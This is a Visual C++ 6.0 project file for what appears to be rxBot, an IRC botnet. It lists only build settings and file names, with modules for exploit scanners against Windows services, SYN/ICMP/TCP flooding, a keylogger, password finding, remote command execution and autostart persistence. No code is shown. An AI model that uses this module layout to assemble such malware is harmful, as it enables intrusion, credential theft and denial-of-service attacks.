# Microsoft Developer Studio Project File - Name="Drx" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=Drx - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "rBot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "rBot.mak" CFG="Drx - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Drx - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "bin/Release"
# PROP Intermediate_Dir "bin/Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /I "C:\Program Files\Microsoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo /o"bin/Release/drxBot.bsc"
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:windows /machine:I386 /out:"bin/rxBot.exe"
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "Drx - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "Scanner files"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\src\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\src\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\src\lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\src\lsass2.cpp
# End Source File
# Begin Source File

SOURCE=.\src\mssql.cpp
# End Source File
# Begin Source File

SOURCE=.\src\mssqllsass.cpp
# End Source File
# Begin Source File

SOURCE=.\src\ndcass.cpp
# End Source File
# Begin Source File

SOURCE=.\src\netbios.cpp
# End Source File
# Begin Source File

SOURCE=.\src\realcast.cpp
# End Source File
# Begin Source File

SOURCE=.\src\scan.cpp
# End Source File
# Begin Source File

SOURCE=.\src\wins.cpp
# End Source File
# Begin Source File

SOURCE=.\src\wkssvc.cpp
# End Source File
# End Group
# Begin Group "DDoS files"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\src\ddos.cpp
# End Source File
# Begin Source File

SOURCE=.\src\icmpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\src\pingudp.cpp
# End Source File
# Begin Source File

SOURCE=.\src\skysyn.cpp
# End Source File
# Begin Source File

SOURCE=.\src\synflood.cpp
# End Source File
# Begin Source File

SOURCE=.\src\tcpflood.cpp
# End Source File
# End Group
# Begin Group "Server files"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\src\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\src\httpd.cpp
# End Source File
# Begin Source File

SOURCE=.\src\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\src\tftpd.cpp
# End Source File
# End Group
# Begin Group "Redirect files"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\src\redirect.cpp
# End Source File
# Begin Source File

SOURCE=.\src\socks4.cpp
# End Source File
# End Group
# Begin Group "Utils files"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\src\download.cpp
# End Source File
# Begin Source File

SOURCE=.\src\driveinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\src\findfile.cpp
# End Source File
# Begin Source File

SOURCE=.\src\keylogger.cpp
# End Source File
# Begin Source File

SOURCE=.\src\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\src\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\src\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\src\remotecmd.cpp
# End Source File
# Begin Source File

SOURCE=.\src\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\src\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\src\visit.cpp
# End Source File
# End Group
# Begin Group "Core files"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\src\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\src\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\src\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\src\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\src\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\src\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\src\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\src\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\includes\net.cpp
# End Source File
# Begin Source File

SOURCE=.\src\rBot.cpp
# End Source File
# Begin Source File

SOURCE=.\src\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\src\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\src\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\src\wildcard.cpp
# End Source File
# End Group
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "Scanner headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\includes\advscan.h
# End Source File
# Begin Source File

SOURCE=.\includes\dcom.h
# End Source File
# Begin Source File

SOURCE=.\includes\lsass.h
# End Source File
# Begin Source File

SOURCE=.\includes\lsass2.h
# End Source File
# Begin Source File

SOURCE=.\includes\mssql.h
# End Source File
# Begin Source File

SOURCE=.\includes\mssqllsass.h
# End Source File
# Begin Source File

SOURCE=.\includes\netbios.h
# End Source File
# Begin Source File

SOURCE=.\includes\realcast.h
# End Source File
# Begin Source File

SOURCE=.\includes\scan.h
# End Source File
# Begin Source File

SOURCE=.\includes\wins.h
# End Source File
# Begin Source File

SOURCE=.\includes\wkssvc.h
# End Source File
# End Group
# Begin Group "DDoS headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\includes\ddos.h
# End Source File
# Begin Source File

SOURCE=.\includes\icmpflood.h
# End Source File
# Begin Source File

SOURCE=.\includes\pingudp.h
# End Source File
# Begin Source File

SOURCE=.\includes\skysyn.h
# End Source File
# Begin Source File

SOURCE=.\includes\synflood.h
# End Source File
# Begin Source File

SOURCE=.\includes\tcpflood.h
# End Source File
# End Group
# Begin Group "Server headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\includes\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\includes\httpd.h
# End Source File
# Begin Source File

SOURCE=.\includes\ident.h
# End Source File
# Begin Source File

SOURCE=.\includes\tftpd.h
# End Source File
# End Group
# Begin Group "Redirect headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\includes\redirect.h
# End Source File
# Begin Source File

SOURCE=.\includes\socks4.h
# End Source File
# End Group
# Begin Group "Utils headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\includes\download.h
# End Source File
# Begin Source File

SOURCE=.\includes\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\includes\findfile.h
# End Source File
# Begin Source File

SOURCE=.\includes\findpass.h
# End Source File
# Begin Source File

SOURCE=.\includes\keylogger.h
# End Source File
# Begin Source File

SOURCE=.\includes\misc.h
# End Source File
# Begin Source File

SOURCE=.\includes\netutils.h
# End Source File
# Begin Source File

SOURCE=.\includes\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\includes\visit.h
# End Source File
# End Group
# Begin Group "Core headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\includes\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\includes\autostart.h
# End Source File
# Begin Source File

SOURCE=.\includes\crc32.h
# End Source File
# Begin Source File

SOURCE=.\includes\crypt.h
# End Source File
# Begin Source File

SOURCE=.\includes\dcc.h
# End Source File
# Begin Source File

SOURCE=.\includes\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\includes\externs.h
# End Source File
# Begin Source File

SOURCE=.\includes\fphost.h
# End Source File
# Begin Source File

SOURCE=.\includes\functions.h
# End Source File
# Begin Source File

SOURCE=.\includes\globals.h
# End Source File
# Begin Source File

SOURCE=.\includes\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\includes\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\includes\net.h
# End Source File
# Begin Source File

SOURCE=.\includes\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\includes\passwd.h
# End Source File
# Begin Source File

SOURCE=.\includes\processes.h
# End Source File
# Begin Source File

SOURCE=.\includes\rBot.h
# End Source File
# Begin Source File

SOURCE=.\includes\remotecmd.h
# End Source File
# Begin Source File

SOURCE=.\includes\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\includes\secure.h
# End Source File
# Begin Source File

SOURCE=.\includes\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\includes\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\includes\threads.h
# End Source File
# Begin Source File

SOURCE=.\includes\wildcard.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\includes\configs.h
# End Source File
# Begin Source File

SOURCE=.\includes\defines.h
# End Source File
# Begin Source File

SOURCE=.\includes\includes.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# Begin Group "Docs"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\docs\Changes.txt
# End Source File
# End Group
# End Target
# End Project
